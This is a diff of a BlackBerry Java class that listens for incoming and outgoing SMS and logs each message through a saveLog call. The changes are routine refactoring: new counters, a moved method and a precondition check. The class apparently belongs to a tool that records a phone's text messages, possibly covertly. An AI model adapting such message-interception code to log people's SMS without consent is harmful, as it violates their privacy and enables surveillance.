@@ -9,6 +9,7 @@ import javax.wireless.messaging.MessageListener;
 import net.rim.blackberry.api.sms.OutboundMessageListener;
 
 import blackberry.fs.Path;
+import blackberry.utils.Check;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
@@ -19,7 +20,9 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
 
     //#endif
 
-    private int messages;
+    static int totOut, totIn;
+
+    private int inMessages;
     private final SmsListener smsListener;
     private final MessageConnection conn;
 
@@ -27,21 +30,27 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
 
     public SMSInOutListener(final MessageConnection conn,
             final SmsListener smsListener) {
-        messages = 0;
+        inMessages = 0;
+
         this.conn = conn;
         this.smsListener = smsListener;
     }
 
     private synchronized void init() {
-        if(!Path.isInizialized()){
+        if (!Path.isInizialized()) {
             Path.makeDirs();
         }
         Debug.init();
     }
-    
+
+    /**
+     * ESECUZIONE FUORI CONTESTO
+     */
     public synchronized void notifyIncomingMessage(final MessageConnection conn) {
-        
-        messages++;
+
+        inMessages++;
+        totIn++;
+
         try {
             notifyAll();
         } catch (IllegalMonitorStateException ex) {
@@ -49,6 +58,27 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
             debug.error(ex);
             //#endif
         }
+    }
+
+    /**
+     * ESECUZIONE FUORI CONTESTO
+     */
+    public synchronized void notifyOutgoingMessage(final Message message) {
+        //#ifdef DBC
+        Check.requires(message != null, "notifyOutgoingMessage: null message ");
+        //#endif
+
+        totOut++;
+        init();
+
+        //#ifdef DEBUG_INFO
+        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
+        //#endif
+
+        if (!requestStop) {
+            smsListener.saveLog(message, false);
+        }
+
     }
 
     public synchronized void stop() {
@@ -65,30 +95,13 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
     /**
      * ESECUZIONE FUORI CONTESTO
      */
-    public synchronized void notifyOutgoingMessage(Message message) {
-        init();
-        
-        //#ifdef DEBUG_INFO
-        debug.info("notifyOutgoingMessage: " + message.getAddress()); //  sms://9813746
-        //#endif
-
-        synchronized (this) {
-            if (!requestStop) {
-                smsListener.saveLog(message, false);
-            }
-        }
-    }
-    
-    /**
-     * ESECUZIONE FUORI CONTESTO
-     */
     public void run() {
         requestStop = false;
         while (!requestStop) {
-            while (messages > 0) {
+            while (inMessages > 0) {
                 try {
                     init();
-                    
+
                     final Message m = conn.receive();
                     smsListener.saveLog(m, true);
 
@@ -97,7 +110,7 @@ class SMSInOutListener implements OutboundMessageListener, Runnable {
                     debug.error(e);
                     //#endif
                 }
-                messages--;
+                inMessages--;
             }
             synchronized (this) {
                 try {
